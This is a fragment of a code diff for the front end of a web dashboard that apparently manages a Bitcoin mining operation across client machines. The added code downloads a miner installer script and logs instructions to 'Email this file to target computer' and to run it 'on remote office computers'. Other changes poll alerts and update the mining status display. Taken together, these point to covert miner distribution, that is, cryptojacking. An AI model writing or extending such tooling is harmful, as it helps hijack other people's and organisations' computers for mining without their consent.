+                a.download = 'Bitcoin-Mining-Worker-Installer.sh';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                addTerminalLog('info', 'Email installer downloaded successfully');
+                addTerminalLog('info', 'Email this file to target computer');
+            } catch (error) {
+                addTerminalLog('error', 'Failed to download email installer: ' + error.message);
+            }
+        }
+
+        async function downloadInstructions() {
+            try {
+                const response = await fetch('/README-INSTALLER.md');
+                const instructions = await response.text();
+                
+                const blob = new Blob([instructions], { type: 'text/markdown' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'Installation-Instructions.md';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                addTerminalLog('info', 'Installation instructions downloaded');
+                addTerminalLog('info', 'Read this file for complete setup guide');
+            } catch (error) {
+                addTerminalLog('error', 'Failed to download instructions: ' + error.message);
+            }
         }
 
         async function downloadInstaller() {
@@ -1680,7 +2511,7 @@
                 document.body.removeChild(a);
                 window.URL.revokeObjectURL(url);
                 
-                addTerminalLog('info', 'Installer script downloaded successfully');
+                addTerminalLog('info', 'Advanced installer script downloaded successfully');
                 addTerminalLog('info', 'Run on remote office computers: chmod +x bitcoin-mining-installer.sh && ./bitcoin-mining-installer.sh');
             } catch (error) {
                 addTerminalLog('error', 'Failed to download installer: ' + error.message);
@@ -1694,6 +2525,7 @@
             loadIntensitySettings();
             
             // Update UI with restored state
+            updateMiningStatusUI(miningState.allMining);
             updateButtonStates();
             updateStatistics();
             renderClients();
@@ -1730,6 +2562,16 @@
                 updateStatistics();
                 renderClients();
             }, 5000);
+
+            // Fetch alerts every 10 seconds
+            setInterval(async () => {
+                await fetchAlerts();
+            }, 10000);
+
+            // Initial alerts fetch
+            setTimeout(async () => {
+                await fetchAlerts();
+            }, 2000);
             
             // Add some initial terminal logs
             setTimeout(() => {
